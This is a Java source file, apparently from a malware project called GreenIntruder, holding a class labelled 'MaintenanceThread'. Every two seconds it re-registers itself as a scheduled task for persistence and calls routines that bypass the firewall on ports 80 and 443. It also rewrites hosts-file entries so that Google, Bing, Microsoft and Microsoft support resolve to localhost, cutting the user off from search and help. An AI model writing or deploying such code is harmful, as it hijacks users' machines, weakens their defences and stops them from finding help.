package io.github.explodingbottle.greenintruder.certifier.admintools;

import java.util.HashMap;
import java.util.Map;

public class MaintenanceThread extends Thread {

	private static final int CHECK_TIME = 2000;

	private Map<String, String> toBlock;

	public MaintenanceThread() {

		toBlock = new HashMap<>();

		toBlock.put("google.com", "127.0.0.1");
		toBlock.put("www.google.com", "127.0.0.1");
		toBlock.put("bing.com", "127.0.0.1");
		toBlock.put("www.bing.com", "127.0.0.1");
		toBlock.put("microsoft.com", "127.0.0.1");
		toBlock.put("www.microsoft.com", "127.0.0.1");
		toBlock.put("support.microsoft.com", "127.0.0.1");
	}

	public void run() {
		while (!interrupted()) {
			if (!DeployerTool.isScheduledTaskRegistred())
				DeployerTool.registerAsScheduledTask();
			if (!DeployerTool.firewallCheck(80))
				DeployerTool.firewallBypass(80);
			if (!DeployerTool.firewallCheck(443))
				DeployerTool.firewallBypass(443);
			toBlock.forEach((host, ip) -> {
				if (!HostsUtils.isRuleRegistred(host, ip))
					HostsUtils.registerRule(host, ip);
			});
			try {
				Thread.sleep(CHECK_TIME);
			} catch (InterruptedException ignored) {
			}
		}
	}
}
